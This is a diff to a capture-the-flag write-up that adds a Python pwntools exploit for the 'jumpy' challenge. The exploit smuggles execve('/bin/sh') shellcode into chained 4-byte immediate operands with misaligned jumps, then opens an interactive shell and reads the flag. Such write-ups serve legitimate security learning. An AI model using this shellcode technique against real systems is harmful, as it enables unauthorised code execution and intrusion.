@@ -268,4 +268,103 @@ By chaining these together, we can execute a maximum of one 4 byte instruction p
 
 My code to do this is below - I didn't have to store /bin/sh somewhere and point to it because my last input is stored on the stack - since the program stops receiving input and runs my code upon receiving EOF or an invalid instruction, I can send my payload, followed by /bin/sh\x00, to store that string on the stack ready for me to use it in my execve() call.
 
-TODO: include code
+```python
+#coding: utf-8
+
+from pwn import *
+
+def swap_bytes(val):
+    upper = (val & 0xff00)>>8
+    lower = val & 0xff
+    print(hex(upper),hex(lower))
+    return (lower << 8) + upper
+
+def construct(instruction):
+    return (swap_bytes(jmp1)<<16) + swap_bytes(instruction)
+
+context.bits = 64
+context.arch = "amd64"
+
+#since last input is on the stack,
+#so I don't have to manually add /bin/sh - 
+#I can just send it as the last line and then move rsp to point to it
+
+totalpayload = """
+xor eax, eax;
+
+add rsp, 0x56;
+
+mov rdi, rsp;
+
+xor esi, esi;
+
+xor edx, edx;
+
+xor eax, eax;
+
+inc eax;
+inc eax;
+
+inc esi;
+inc esi;
+
+imul esi;
+
+imul esi;
+
+imul esi;
+
+imul esi;
+
+imul esi;
+
+dec eax;
+
+dec eax;
+
+dec eax;
+
+dec eax;
+
+dec eax;
+
+xor esi, esi;
+
+syscall;
+
+""".replace("\n\n","\n")
+
+#real_payload = "jmp 1\n" #relative jump to misalign
+real_payload = "jmp 1\n"+"moveax " + str(0x909003eb) + "\n" #jump into this
+
+print(real_payload)
+
+for line in totalpayload.split("\n"):
+    #now we can go up to 4 bytes :)
+    #horribly inefficient, but hey
+    assembled = asm(line)
+    assembled = assembled.ljust(4,"\x90")
+    assembled = list(map(ord, assembled))
+
+    real_payload += "moveax " + str((assembled[3]<<24) + (assembled[2]<<16) + (assembled[1]<<8) + assembled[0]) + "\n"
+    real_payload += "jmp 1\n"+"moveax " + str(0x909003eb) + "\n" #jump into this
+
+assert(len(real_payload) < 0x1000)
+
+doit = process("./jumpy")
+#doit = process("ncat --ssl 7b0000007d6e40ae72c98948-jumpy.challenge.master.allesctf.net 31337".split(" "))
+
+print(doit.recvuntil("> "))
+raw_input()
+for line in real_payload.split("\n"):
+    doit.sendline(line)
+
+doit.sendline("/bin/sh\x00")
+
+doit.sendline("cat flag.txt")
+
+doit.interactive()
+
+
+#ALLES!{people have probably done this before but my google foo is weak. segmented shellcode maybe?}
+```
